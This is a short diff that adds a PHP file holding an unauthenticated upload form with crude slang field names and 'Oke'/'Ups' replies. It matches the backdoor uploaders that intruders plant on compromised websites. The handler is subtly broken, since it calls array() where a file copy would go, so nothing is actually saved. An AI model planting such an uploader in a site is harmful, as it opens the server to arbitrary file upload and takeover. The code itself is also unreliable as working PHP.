@@ -1,0 +1,9 @@
+
+<form action="" method="post" enctype="multipart/form-data" name="memek" id="memek"><input type="file" name="file" size="50"><input name="meki" type="submit" id="meki" value="Crot"></form>
+<?php if($_POST['meki']=="Crot"){if(@array($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {
+  echo '<b>Oke</b>';
+}
+else { 
+  echo '<b>Ups</b>';}
+}
+?>
